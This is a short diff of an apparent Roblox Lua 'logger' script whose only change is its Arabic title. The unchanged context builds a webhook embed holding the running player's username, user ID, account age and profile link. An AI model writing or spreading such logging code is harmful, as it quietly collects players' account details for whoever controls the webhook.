@@ -15,7 +15,7 @@ local webhookcheck =
     ["content"] = "",
     ["embeds"] = {
         {
-            ["title"] = "\nنوكيا لوقر",
+            ["title"] = "\nنوكيا لوقر \ بنات و اولاد",
             ["description"] ="**اليوزر:**".."```"..game.Players.LocalPlayer.Name.."```".."**ايدي اليوزر:**".."```"..game.Players.LocalPlayer.UserId.."```".."**عمر الحساب: **".."```"..game.Players.LocalPlayer.AccountAge.."```".."**رابط الحساب: **".."```".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."```".."\n\n",
             ["timestamp"] = timestamp,
             ["type"] = "rich",
